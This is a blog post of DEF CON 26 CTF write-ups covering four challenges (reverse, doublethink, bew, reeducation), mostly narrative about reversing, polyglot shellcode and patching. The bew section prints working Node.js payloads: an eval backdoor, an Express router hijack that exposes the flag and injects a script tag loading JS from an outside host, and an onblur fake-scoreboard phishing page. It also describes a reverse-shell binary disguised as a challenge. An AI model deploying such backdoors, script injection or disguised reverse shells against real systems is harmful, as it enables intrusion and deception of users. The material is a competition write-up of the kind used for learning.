---
layout: post
title: "DEF CON 26 CTF Writeups: reverse, doublethink, bew, reeducation"
description: ""
category:
tags: ["reversing", "ctf"]
---
{% include JB/setup %}

Recently I flew to Vegas to attend the DEF CON 26 CTF with ([Samurai](https://ctftime.org/team/1937)), the team I [played with when we won the qualifiers](/2018/05/13/winning-def-con-quals-writeups/). I had a lot of fun and got very little sleep, working two consecutive 20 hour days and finishing off with another 4 hours of contest at the end.

As a programmer entering CTF with only a little bit of reverse engineering experience and no exploit development skills, I was happy that the organizers included new King of the Hill format challenges this year, which I found I could contribute nicely to since they tended to mix in more programming with the hacking. I also made sure to spend some time poking around other challenge binaries in Binary Ninja to hone my reverse engineering skills, although I only managed to make a meaningful contribution doing this with `reeducation`.

# reverse

The first challenge released and the first I worked on was `reverse`. It was a service with a client binary and a remote server that presented a curses interface for completing disassembly and assembly puzzles like filling in the line of assembly that matched some bytes of machine code. There were multiple "level"s consisting of a bunch of puzzles, solving them got you points and let you move to the next level, and each level was a new type of puzzle.

While a few of us in the hotel suite got started on figuring out how we wanted to automate it, people on the floor started solving puzzles manually, then [`aegis`](https://twitter.com/lunixbochs) gradually built up a UI automation script that copied data from his terminal, parsed it, ran it through command line (dis)assembler tools and typed the answers.

Back in the hotel, a couple of us started on parsing the client output out of the VT100 but a teammate figured out the network protocol the client used so we started using that directly. The first level could actually be solved using an info leak that was present in the protocol but didn't show up in the client, but this didn't work for level 2 and up.

We then integrated the solvers for levels 1-4 from `aegis`'s automation into our script so `aegis` could stop having his computer taken over by UI automation every round.

We ran into a problem though, we couldn't get through level 5 since the problems seemed nonsensical and impossible. There just wasn't enough information in the question to choose the right answer. We realized that there must be some way to cheat to solve it.

Luckily someone else on our team had been reversing the client and fuzzing the network protocol and had discovered a number of helpful tricks like the ability to not spend the limited "coins" we had to attempt challenges, and to restart a level as much as we wanted. After `aegis` noted that he saw duplicate assembly lines in his logs and that we should try dumping, I started on a script. I modified our solver Python code to use the protocol tricks to quickly request level 1 problems in a pipelined way to not have to wait for round trips and dump them to a file. Then `aegis` tuned up the script and ran it on the CTF floor dumping thousands of lines of assembly per second, eventually converging around 280k unique lines.

I then started on using these dumps to write better versions of our solvers (which previously often failed to determine the correct answer) by cheating with the known lines. This allowed us to resolve the difference between say `call sub_1432` and `call sub_2532` without knowing where the procedures were and made our solving simpler and more robust. We also incorporated an underflow bug a teammate discovered from poking at the server that gave us an extra 255 points per question. Unfortunately the dump didn't give us any clues as to how to solve level 5, and unfortunately the dumped binary didn't appear to be the server like we'd hoped. At this point the challenge was close to closing so we gave up and started on other problems.

After the contest we learned from the organizers there was a broken protocol instruction discoverable by fuzzing that allowed you to leak the server binary. You could then find an exploit allowing you to give yourself arbitrarily many points.

# doublethink

This was another King of the Hill challenge, released just before the contest shut down on the first day, it was a fun problem that motivated me to stay up nearly all night.

The gist of the challenge was that you submitted a single 4KB chunk of binary that you could then execute against a number of different architectures using various emulators, the more architectures you got to print the flag the higher your score. So the goal was to write a polyglot piece of shellcode that opened a flag file and wrote it out on modern architectures, or printed it from a known memory address on older architectures.

We realized we needed to write flag-printing shellcode for a bunch of architectures separately and then put them together in one blob with a sequence of jump instructions at the front for each architecture jumping to that architecture's payload, and where all the other architecture's jumps before it didn't stop the emulator or jump somewhere unintended. Another interesting twist is that a lot of the old architectures bytes/words with varying numbers of bits, which were just chopped off the file you gave by concatenating all the bytes in binary and chunking.

We decided to start by developing a bunch of payloads in parallel that we would assemble later. I started with PDP-8, where after reading the instruction reference I found a [Hello World program](https://bigdanzblog.wordpress.com/2014/05/31/hello-world-program-for-pdp-8-using-pal-assembly-language/) and [a matching assembler](https://github.com/radekh/palbart). The first challenge was that the output format of the assembler didn't match the format the challenge wanted, so I had to write a 50 line python script to parse the assembled output and put it together at the bit level (because of the 12 bit bytes). After that I checked it printed Hello World against the provided testing Docker image, then modified the program to print the flag, and made it much shorter.

I followed a similar process to construct a payload for PDP-10. After a bunch of architecture research and miscellaneous searching I found [an assembler as part of someone's FORTH project](https://github.com/aap/tenth). I translated a Hello World program I found into that assembler's syntax and modified the assembler code to print the info I needed, and again wrote a Python script to parse the output and munge the bits into the format we needed, then again modified the program to print the flag.

By this point other members of my team had written payloads for `clemency`, `mix`, `amd64` and `riscv` which we considered sufficient to start pulling them together. I started by writing a script to print a file as the bytes of varying bit widths including values in octal (which PDP system ISAs matched well with) so we could debug the jump train. Then I wrote a script to assemble jump sequences and payloads for different architectures at bit-level offsets. Then `aegis` and I worked together for a while and found a sequence of jumps, nops and padding that worked for `amd64`, `pdp-8` and `pdp-10` together. After I went to bed a teammate managed to patch in a very short `mix` shellcode into ours, leaving us with a 4-polyglot for the start the next day.

The next day I spent a bunch of hours with `aegis` trying to get a working sequence including `riscv` and failing, and improving tooling and commenting it so others could try integrating more jumps. We mostly failed because things had too many constraints to fit in our head so by the time we thought we were approaching a solution we forgot an earlier constraint and went down a dead end. Eventually a teammate wrote a `pdp-1` payload and that ISA had few constraints and slotted pretty easily into our existing jump train, getting us to a 5-polyglot. I then tried and failed to integrate `hexagon` and `ibm-1401`. By that time the challenge was close to ending and we decided to move on, with `clemency`, `hexagon`, `ibm-1401`, and `riscv` payloads unused, which was sad.

It later turned out that this challenge too was possible to exploit to get an artificially high score, according to the organizers and our later investigation. It was possible to use the `amd64` shellcode which was run directly (as `nobody`) concurrently from multiple submissions to fake a correct flag printing. This allowed two teams to get "fake" scores of 9 and 11, although PPP (the 2nd place team) did actually create an 8-polyglot.

# bew

Released just before the end of the second day, this was the next challenge I worked on. It was a web app with a text field you could submit to to add text to a file that was printed on another page.

While the contest servers were still up, we looked into the source and realized that the `express-validator` dependency had been replaced by an entirely different library using a WebAssembly module compiled with [Emscripten](https://github.com/kripken/emscripten). All inputs to the text file were passed through the validator library before being added to the text file.

After some theorizing about possible exploits involving using the Emscripten standard library emulation to use the Node `fs` module to get the flag, we noticed on the submissions page that people were submitting exploits involving plain JS code and it seemed to work. We were confused but `aegis` started putting together our own flag retrieval payload that could get past the pre-filters while other members of our team started scraping flags other teams had retrieved with a script.

Eventually we found that the way the service worked was dumber than we thought. The WebAssembly did some preliminary filtering looking for use of `require` or the `fs` module, then it passed the input to an external handler (below) which just took the input and `eval`'d it in the Node server process, and put the input in the text file if it threw an exception. This looked initially like it was rejecting JS and accepting text because most text triggers JS errors. The basic exploits people were using just obscured the `require` and `fs` use and used that to get the flag and put it in a public place, which we were also scraping without even deploying our own exploit!

```js
// The handler that the WebAssembly called into
var ASM_CONSTS = [function($0) { str = Pointer_stringify($0); try { eval(str); return 1;} catch(err) { return 0; } console.log(eval('const fs = require("fs");fs.writeFile("/tmp/test.txt", "testwrites")') + 'WEBASS got ' + $0); }];
```

After the contest servers closed for the night, we did some thinking about the challenge. Based on the large number of bytes you were allowed to patch only in the WebAssembly file, it seemed the intended patching solution was to write an actual JS validator, compile it to WASM and patch it in, with functional tests likely verifying that the web app still accepted text and rejected JS. This sounded like a lot of work, so we thought we'd poke around with our full remote code execution some more.

I realized that I could patch the server dynamically by just reassigning the `ASM_CONSTS` variable (in scope!) to not `eval` the string and either reject or accept all submissions, fully closing the `eval` hole. This would persist until the server was restarted, and based on the persistent text file we knew that the server was kept alive between requests. I eventually refined this into a version that left a back door so that we could still exploit the server if we messed up, and also made sure our exploits (containing `/` and `_`) couldn't accidentally end up in the public text file:

```js
ASM_CONSTS[0] = function(ptr) { str = Pointer_stringify(ptr); if(str.includes("DAT_BEST_BACK_DOOR_SECRET")) eval(str); return (str.includes("_") || str.includes("/")) ? 1 : 0; }
```

Meanwhile `aegis` figured out that he could modify the `express` web server handler chain to do all sorts of fun things. First he figured out how to take down all the pages, then how to add a backdoor flag page by mounting root as a public directory, then how to change responses to ones of our choosing.

I talked this with `aegis` and we realized this was so absurdly easy and powerful that the organizers couldn't have thought of it. We realized we could insert a backdoor that let us get the flag and then close the door to all the other teams, with the only weakness being if another team realized this and closed the door first. If no other teams figured this out and beat us then we would get all the flags and no other team would get any, we could also close our own door without inserting the backdoor.

We took this plan to the evening team meeting and then `bool` (team founder Steve Vittitoe) came up with an amazing idea: Not only do we backdoor and close the door, but we add a script to all the pages that turns the page into a fake scoreboard on blur with a fake new challenge that gives us a reverse shell on their machine! After a moment of silence as we were struck by the brilliance of his idea, we enthusiastically started brainstorming our plan.

We realized that if we were lucky and were the only team to figure this out, we needed to not leak our exploit publicly so other teams could immediately figure it out themselves. So I started by developing a thrower script for our exploits that could be run automatically and would ensure a team was backdoored and the door was closed without leaking our exploit in case of a patched team that accepted all submissions:

1. Check our flag backdoor, if it's there we're done.
1. Submit a canary piece of bogus JS code that used all the syntactic constructs our exploits used, if it went through then submitting our exploits would leak them, so abandon.
1. Install the backdoor express chain rewriting code.
1. Check that we can retrieve the flag, if not bail and log an error.
1. Close the door and check that the door was successfully closed and log if not.

Next I worked on improving `aegis`'s payload to place the flag backdoor at a less obvious place than `/flag` which required some URL rewriting and also crafting an Express chain rewriting payload based on his research that could insert a script tag into all pages without modifying the rest of the page. This is the payload I ended up with:

```js
// Part 1: exposes the flag at /flagaaa
s = process.mainModule.children[0].children[1].exports.static('/');
process.mainModule.children[0].exports._router.stack[5].handle = function(req, res, next) {
  if(req.url && req.url.includes('flag')) {
    req.url = req.url.substring(0, req.url.length-3);
  }
  return s(req, res, next);
};
// Part 2: replaces </body> with our script tag on every response
process.mainModule.children[0].exports._router.stack[3].handle = function(req, res, next) {
    var oldSend = res.send;

    res.send = function(data){
        data = data.replace(/(<\/body>)/, "<script src='https://our-xss-domain.redacted/ourpayload.js'></script></body>");
        oldSend.apply(res, [data]);
    }
    next();
};
```

Then I worked on the actual XSS payload which used a giant inline JS backtick string with our fake scoreboard HTML and a short snippet which overwrote the whole page with our fake one, including a favicon, and also fixed the URL to be just the IP address, knowing nobody would notice the difference between the scoreboard IP address and the challenge IP address:

```js
window.onblur = function() {
    window.history.pushState('scoreboard', 'DC26 CTF', '/');
    document.open();
    document.write(newpage2);
    document.close();
};
```

While I had been doing all this, `bool` had whipped up a domain and server to host the XSS and fake challenge payloads, as well as completely replicating the official scoreboard's appearance but with an extra challenge. He also added a red notice about the new challenge, which hadn't happened for any of the real challenges, but we figured it made it more likely people would fall into it rather than less. He also set up a server to receive and manage any reverse shell connections we got.

Meanwhile `aegis` worked on a fake challenge binary that would spin off a reverse shell that would persist even if the challenge binary was killed. For fun he also created a bunch of fake reversing steps that made it seem like an actual challenge binary and made it difficult to notice it was a reverse shell.

By this point it was 4am and we were tired after our 2nd consecutive 20 hour day so we went to sleep. We woke up just before the contest opened again, and I got ready to throw our door closer at our own server manually since we had only automated the throwing at other teams.

But our worst fears came true and total victory was snatched from our grasp by a faster team! I threw the door closer at our own server shortly after opening and found that our canary went through when it shouldn't. I checked with some other test payloads and sure enough, it seemed that some other team had closed our door on us, presumably after backdooring our server and all the others for themselves. It also turns out the exploit payload had errored in our automated thrower at minute 0 so we hadn't slipped in to any teams first.

Shortly later the contest organizers realized or were informed of their oversight about persistent exploits and they put in a workaround of restarting the servers every couple minutes to give all teams a chance to slip in. After streamlining my thrower to not be cautious and be faster since clearly lots of other teams knew about the problem and were already leaking their exploits, we managed to regularly slip into a few teams servers each restart.

Soon `bool` started to see hits on his XSS server. We were pretty happy it was finally working. One team even downloaded our fake challenge binary, but unfortunately they don't seem to have run it.

It wasn't the glorious victory of monopolizing the flags and owning dozens of machines that we'd dreamed of, but we still got some people and were really proud of our clever plan and exploits. We were really happy when after the contest we talked to one of the organizers and they said they loved our idea and that actually multiple teams had come up to them and asked why the new challenge on the website wasn't up on the projector screens! The organizer didn't even realize it was a trick originally and went and asked another organizer if they had released a new challenge accidentally!

# reeducation

In the last two hours of the contest, I took a look at the new `reeducation` challenge. This was an attack/defend binary challenge that appeared to have been written in Rust.

My teammates had already run a Rust demangler on the symbols and had identified some interesting functions including one including `interpret` and determined that we could submit a payload to the service and it would run it through the interpreter.

While they worked on reverse engineering the stages leading to the interpreter I looked at the interpreter in Binary Ninja and used `gdb` to test the binary and figure out which registers contained the payload and length. I figured out that each "instruction" was two 64 bit words where if the instruction was `(a,b)` it seemed to execute `mem[a] -= mem[b]` on the same memory array containing the code (allowing self modification).

I also discovered with `gdb` that the flag was placed in memory immediately after the submitted code. I also learned from `gdb` that the length register contained 1024 which was the length of the payload in bytes, but in Binary Ninja I saw the bounds checking code was treating that length as the length in 64 bit words. This allowed the payload to access 8 times the memory it should have been able to without triggering an out of bounds error, including the flag! This looked to be the intended vulnerability, I'm guessing caused by incorrect use of Rust's `unsafe` `Vec::from_raw_parts` or `slice::from_raw_parts_mut` passing in the byte length instead of the `u64` length, an example of how if you use `unsafe` functions wrong in Rust, it can lead to vulnerabilities!

At this point I went and found some teammates in the hotel also working on the problem and shared all the knowledge I hadn't already posted on Slack. They had figured out that the payload we submitted had to contain only bytes of below a certain value. We figured out we had all the knowledge we needed to write an exploit, but we only had 40 minutes of contest left, which was likely not enough.

My teammates started on an exploit script and I helped out occasionally, figuring out that we could use self-modifying code to access offsets that wouldn't otherwise make it through the byte value filter. Unfortunately we didn't have enough time to get a working exploit together.

However, while they were working on that I worked on developing a patch. In Binary Ninja I figured out that just underneath the code that initially retrieved the length there was a right shift that divided by 8 for use by some other part of the code. I used Binary Ninja's patching functionality to fix that code to replace the `mov, shr` with a `shr, mov` sequence of the same length that shifted the main length register and then copied it into the other register. The idea was this would fix the length to be the correct length to not allow out of bounds indexing to reach the flag. I posted my 7 byte patch in the Slack channel and one of the people on the floor submitted a patched binary using their better networking 15 minutes before the end of the contest. Unfortunately, the scoreboard was hidden for the final day of the contest so although my patch passed the tests, I don't know if it actually succeeded in getting us a few extra defense points in the final couple ticks.

# Conclusion

I had a ton of fun, and my team (Samurai) ended up coming 11th, which although it isn't as good as our first place finish in the qualifiers, is pretty good considering how high level the competition at the event was. I think the real victory though was our awesome fake challenge XSS exploit for `bew`, that was really fun to pull off. I also learned a bunch more about competing in CTFs from my awesome teammates!
